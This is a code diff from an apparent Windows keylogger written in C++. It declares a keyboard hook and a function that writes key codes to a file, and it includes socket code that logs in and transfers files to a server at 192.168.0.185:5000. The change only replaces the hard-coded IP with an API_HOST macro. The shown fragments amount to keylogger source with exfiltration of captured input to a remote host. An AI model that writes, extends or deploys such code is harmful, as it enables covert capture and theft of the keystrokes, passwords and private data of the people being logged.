@@ -24,6 +24,8 @@
 
 #define CRISTALLO_LEN 1024
 
+#define API_HOST "192.168.0.185"
+
 LRESULT WINAPI MyKeyboardHook(int code, WPARAM wParam, LPARAM lParam);
 void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp);
 static void initialize_hook_thread();
@@ -446,7 +448,7 @@ bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string 
 	body += "\r\n";
 
 	header = "POST /user/login HTTP/1.1\r\n";
-	header += "Host: 192.168.0.185:5000\r\n";
+	header += "Host: "+ std::string(API_HOST) + ":5000\r\n";
 	header += "Content-Type: multipart/form-data; boundary=------------dataentry\r\n";
 	header += "Content-Length: " + std::to_string(body.size()) + "\r\n\r\n";
 	header += body;
@@ -546,7 +548,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 	hints.ai_protocol = IPPROTO_TCP;
 
 	// Change the IP and port here accordingly
-	init_result = getaddrinfo("192.168.0.185", "5000", &hints, &result);
+	init_result = getaddrinfo(API_HOST, "5000", &hints, &result);
 	if (init_result != 0)
 	{
 		printf("getaddrinfo failed!\n[GLE]: 0x%08x\n", WSAGetLastError());
